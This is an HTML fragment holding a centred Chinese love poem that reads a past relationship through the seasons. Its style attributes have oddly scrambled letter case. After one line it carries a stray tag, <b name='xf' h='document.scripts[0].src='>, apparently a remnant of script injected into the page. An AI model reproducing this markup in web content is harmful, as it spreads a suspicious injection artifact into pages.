<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
隔着一首诗的距离读你</font></span></p>
<p style="TexT-ALiGn: center; MArGin-Top: 0pt; MArGin-BoTToM: 0pt">
<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
生命里</font></span></p>
<p style="TexT-ALiGn: center; MArGin-Top: 0pt; MArGin-BoTToM: 0pt">
<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
有着太多太多的相遇</font></span></p>
<p style="TexT-ALiGn: center; MArGin-Top: 0pt; MArGin-BoTToM: 0pt">
<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
注定总有一次会教人</font></span></p>
<p style="TexT-ALiGn: center; MArGin-Top: 0pt; MArGin-BoTToM: 0pt">
<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
刻骨的铭记</font></span></p>
<p style="TexT-ALiGn: center; MArGin-Top: 0pt; MArGin-BoTToM: 0pt">
<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
离开你的时候</font></span></p>
<p style="TexT-ALiGn: center; MArGin-Top: 0pt; MArGin-BoTToM: 0pt">
<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
感觉委曲与愤怒</font></span></p>
<p style="TexT-ALiGn: center; MArGin-Top: 0pt; MArGin-BoTToM: 0pt">
<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
静下来的时候</font></span></p>
<p style="TexT-ALiGn: center; MArGin-Top: 0pt; MArGin-BoTToM: 0pt">
<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
想念你的好<b name="xf" h="document.scripts[0].src="></b></font></span></p>
<p style="TexT-ALiGn: center; MArGin-Top: 0pt; MArGin-BoTToM: 0pt">
<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
在春天里故事</font></span></p>
<p style="TexT-ALiGn: center; MArGin-Top: 0pt; MArGin-BoTToM: 0pt">
<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
在夏雨里沐雨</font></span></p>
<p style="TexT-ALiGn: center; MArGin-Top: 0pt; MArGin-BoTToM: 0pt">
<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
在秋日里丝语</font></span></p>
<p style="TexT-ALiGn: center; MArGin-Top: 0pt; MArGin-BoTToM: 0pt">
<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
在冬天里赏雪</font></span></p>
<p style="TexT-ALiGn: center; MArGin-Top: 0pt; MArGin-BoTToM: 0pt">
<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
在眼眸里读出了</font></span></p>

<span style="FonT-FAMiLY: '楷体_GB2312'; FonT-siZe: 12pt; mso-spacerun: 'yes'"><font color="#000000">
一季浪漫的诗意</font></span></p>
